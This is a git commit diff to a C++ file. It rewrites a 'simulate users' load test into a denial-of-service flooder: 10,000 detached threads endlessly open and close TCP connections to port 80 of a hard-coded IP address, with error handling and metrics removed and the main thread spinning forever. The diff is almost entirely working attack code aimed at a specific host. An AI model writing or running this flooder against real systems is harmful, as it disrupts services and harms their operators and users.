87dbffb2417c32a50df46e5a2b7103d175e2d007
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-18 23:32:18 +0600

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -3,51 +3,40 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <thread>
-#include <vector>
-#include <chrono>
+#include <fcntl.h> // for non-blocking mode
 
-const int numThreads = 10000;
+const int num_threads = 10000;
 
-void simulateUser() {
-    const char* server_ip = "193.228.196.49";
+void connectAndClose() {
+    const char* server_ip = "34.132.134.162";
     const int server_port = 80;
 
-    int clientSocket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
-    if (clientSocket == -1) {
-        std::cerr << "Error creating socket." << std::endl;
-        return;
-    }
+    while (true) {
+        int clientSocket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+        if (clientSocket == -1) {
+            std::cerr << "Error creating socket." << std::endl;
+            return;
+        }
 
-    struct sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(server_port);
-    serverAddr.sin_addr.s_addr = inet_addr(server_ip);
+        struct sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(server_port);
+        serverAddr.sin_addr.s_addr = inet_addr(server_ip);
 
-    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
-        std::cerr << "Error connecting to server." << std::endl;
+        connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
+        
         close(clientSocket);
-        return;
     }
-
-    // Simulate user behavior by keeping the connection open for a while
-    std::this_thread::sleep_for(std::chrono::seconds(1));
-
-    close(clientSocket);
 }
 
 int main() {
-    std::cout << "Simulating " << numThreads << " users...\n";
-
-    std::vector<std::thread> threads;
-    for (int i = 0; i < numThreads; ++i) {
-        threads.push_back(std::thread(simulateUser));
+    for (int i = 0; i < num_threads; ++i) {
+        std::thread connectionThread(connectAndClose);
+        connectionThread.detach();
     }
 
-    for (auto& thread : threads) {
-        thread.join();
-    }
-
-    // Measure and print performance metrics here
+    // Keep the main thread running indefinitely
+    while (true) {}
 
     return 0;
 }
